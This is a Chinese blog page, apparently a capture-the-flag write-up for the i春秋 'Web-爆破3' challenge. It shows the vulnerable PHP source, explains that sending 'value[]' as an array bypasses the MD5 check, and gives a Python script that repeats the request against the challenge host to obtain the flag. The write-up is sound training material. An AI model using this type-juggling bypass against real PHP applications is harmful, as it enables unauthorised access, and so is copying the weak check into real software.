@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>i春秋-Web-爆破3 | Jaylin&#39;s Blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="1234567891011121314151617181920212223242526272829&amp;lt;?php     error_reporting(0);    session_start();    require(&apos;./flag.php&apos;);    if(!isset($_SESSION[&apos;nums&apos;]))&amp;#123;        $_SESSION[&apos;nums&apos;] = 0;">
+<meta name="keywords" content="Web,i春秋,PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="i春秋-Web-爆破3">
+<meta property="og:url" content="http://CHN-Jaylin.github.io/2018/09/10/ichunqiu-web-brute-3/index.html">
+<meta property="og:site_name" content="Jaylin&#39;s Blog">
+<meta property="og:description" content="1234567891011121314151617181920212223242526272829&amp;lt;?php     error_reporting(0);    session_start();    require(&apos;./flag.php&apos;);    if(!isset($_SESSION[&apos;nums&apos;]))&amp;#123;        $_SESSION[&apos;nums&apos;] = 0;">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:updated_time" content="2018-09-11T08:28:14.365Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="i春秋-Web-爆破3">
+<meta name="twitter:description" content="1234567891011121314151617181920212223242526272829&amp;lt;?php     error_reporting(0);    session_start();    require(&apos;./flag.php&apos;);    if(!isset($_SESSION[&apos;nums&apos;]))&amp;#123;        $_SESSION[&apos;nums&apos;] = 0;">
+  
+    <link rel="alternate" href="/atom.xml" title="Jaylin&#39;s Blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Jaylin&#39;s Blog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="搜索"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://CHN-Jaylin.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-ichunqiu-web-brute-3" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2018/09/10/ichunqiu-web-brute-3/" class="article-date">
+  <time datetime="2018-09-10T11:00:25.387Z" itemprop="datePublished">2018-09-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      i春秋-Web-爆破3
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    error_reporting(<span class="number">0</span>);</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="keyword">require</span>(<span class="string">'./flag.php'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">'nums'</span>]))&#123;</span><br><span class="line">        $_SESSION[<span class="string">'nums'</span>] = <span class="number">0</span>;</span><br><span class="line">        $_SESSION[<span class="string">'time'</span>] = time();</span><br><span class="line">        $_SESSION[<span class="string">'whoami'</span>] = <span class="string">'ea'</span>;</span><br><span class="line">    &#125;<span class="comment">//初始化成功次数，时间，whoami</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'time'</span>]+<span class="number">120</span>&lt;time())&#123;</span><br><span class="line">        session_destroy();</span><br><span class="line">    &#125;<span class="comment">//超过两分钟，销毁session</span></span><br><span class="line"></span><br><span class="line">    $value = $_REQUEST[<span class="string">'value'</span>]; <span class="comment">//需要爆破的参数</span></span><br><span class="line">    $str_rand = range(<span class="string">'a'</span>, <span class="string">'z'</span>);</span><br><span class="line">    $str_rands = $str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)].$str_rand[mt_rand(<span class="number">0</span>,<span class="number">25</span>)]; <span class="comment">//$str_rands为随机2位英文字母</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'whoami'</span>]==($value[<span class="number">0</span>].$value[<span class="number">1</span>]) &amp;&amp; substr(md5($value),<span class="number">5</span>,<span class="number">4</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">        $_SESSION[<span class="string">'nums'</span>]++;</span><br><span class="line">        $_SESSION[<span class="string">'whoami'</span>] = $str_rands;</span><br><span class="line">        <span class="keyword">echo</span> $str_rands;</span><br><span class="line">    &#125;<span class="comment">//传入的参数与whoami比较，且md5值的6~9为必须为0或者字符串。下一个whoami值为当前$str_rands</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>($_SESSION[<span class="string">'nums'</span>]&gt;=<span class="number">10</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> $flag;</span><br><span class="line">    &#125;<span class="comment">//成功次数&gt;10，打印flag</span></span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里遇到一个小坑，就是md5比较的时候，纯粹要看RP，我本地爆破了半天，最多一次才成功跑到6，就失败了。</p>
+<p>后来想到，可以通过 <code>value[]</code> array参数 来绕过第二个逻辑表达式，一次成功。</p>
+<p>附爆破脚本 (其实手工也可以)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    url = <span class="string">"http://626f230deed143bcb63490fc62362b9228ecdbe626d84899.game.ichunqiu.com/"</span></span><br><span class="line"></span><br><span class="line">    headers = &#123;</span><br><span class="line">        <span class="string">'accept'</span>: <span class="string">"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"</span>,</span><br><span class="line">        <span class="string">'accept-encoding'</span>: <span class="string">"gzip, deflate"</span>,</span><br><span class="line">        <span class="string">'accept-language'</span>: <span class="string">"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2"</span>,</span><br><span class="line">        <span class="string">'connection'</span>: <span class="string">"keep-alive"</span>,</span><br><span class="line">        <span class="string">'upgrade-insecure-requests'</span>: <span class="string">"1"</span>,</span><br><span class="line">        <span class="string">'user-agent'</span>: <span class="string">"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0"</span>,</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment"># init</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    times = <span class="number">0</span></span><br><span class="line">    whoami = [<span class="string">'e'</span>, <span class="string">'a'</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        param = &#123;<span class="string">"value[]"</span>: whoami[<span class="number">0</span>] + whoami[<span class="number">1</span>]&#125;</span><br><span class="line">        response = s.get(url, params=param, headers=headers)</span><br><span class="line">        whoami = response.text[<span class="number">0</span>:<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> whoami[<span class="number">0</span>].isalpha() <span class="keyword">and</span> whoami[<span class="number">1</span>].isalpha():</span><br><span class="line">            times += <span class="number">1</span></span><br><span class="line">            print(whoami, times)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> times == <span class="number">10</span>:</span><br><span class="line">            print(<span class="string">'\n'</span>)</span><br><span class="line">            print(response.text)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        s.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://CHN-Jaylin.github.io/2018/09/10/ichunqiu-web-brute-3/" data-id="cjlxgfg2q0017i8vnh1ny8ldd" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PHP/">PHP</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/">Web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/i春秋/">i春秋</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2018/09/10/ichunqiu-web-brute-2/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">i春秋-Web-爆破2</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/EXPLOIT/">EXPLOIT</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/PHP/">PHP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Python/">Python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SMB/">SMB</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SQLi/">SQLi</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/">Web</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/i春秋/">i春秋</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql-injection/">sql-injection</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/心路/">心路</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/日常/">日常</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/爬虫/">爬虫</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程溢出/">远程溢出</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签云</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/EXPLOIT/" style="font-size: 10px;">EXPLOIT</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/Python/" style="font-size: 10px;">Python</a> <a href="/tags/SMB/" style="font-size: 10px;">SMB</a> <a href="/tags/SQLi/" style="font-size: 10px;">SQLi</a> <a href="/tags/Web/" style="font-size: 20px;">Web</a> <a href="/tags/i春秋/" style="font-size: 20px;">i春秋</a> <a href="/tags/sql-injection/" style="font-size: 10px;">sql-injection</a> <a href="/tags/心路/" style="font-size: 15px;">心路</a> <a href="/tags/日常/" style="font-size: 15px;">日常</a> <a href="/tags/爬虫/" style="font-size: 10px;">爬虫</a> <a href="/tags/远程溢出/" style="font-size: 10px;">远程溢出</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/09/">九月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/07/">七月 2018</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2018/09/10/ichunqiu-web-brute-3/">i春秋-Web-爆破3</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/10/ichunqiu-web-brute-2/">i春秋-Web-爆破2</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/10/ichunqiu-web-SQLi/">i春秋-Web-SQLi</a>
+          </li>
+        
+          <li>
+            <a href="/2018/09/09/daily-life-20180909/">日常心路-180909</a>
+          </li>
+        
+          <li>
+            <a href="/2018/08/07/sql-injection-cheat-sheet/">SQL注入备忘录</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2018 Jaylin<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
